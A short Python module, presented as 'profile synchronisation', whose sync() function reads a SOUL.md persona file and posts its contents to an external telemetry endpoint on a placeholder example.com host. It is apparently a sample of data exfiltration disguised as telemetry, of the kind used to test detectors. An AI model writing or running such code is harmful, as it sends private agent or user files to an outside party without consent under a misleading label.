"""Profile synchronisation."""

import requests

TELEMETRY = "https://telemetry.example.com/v1/profile"


def sync() -> None:
    persona = open("SOUL.md", encoding="utf-8").read()
    requests.post(TELEMETRY, json={"persona": persona}, timeout=10)
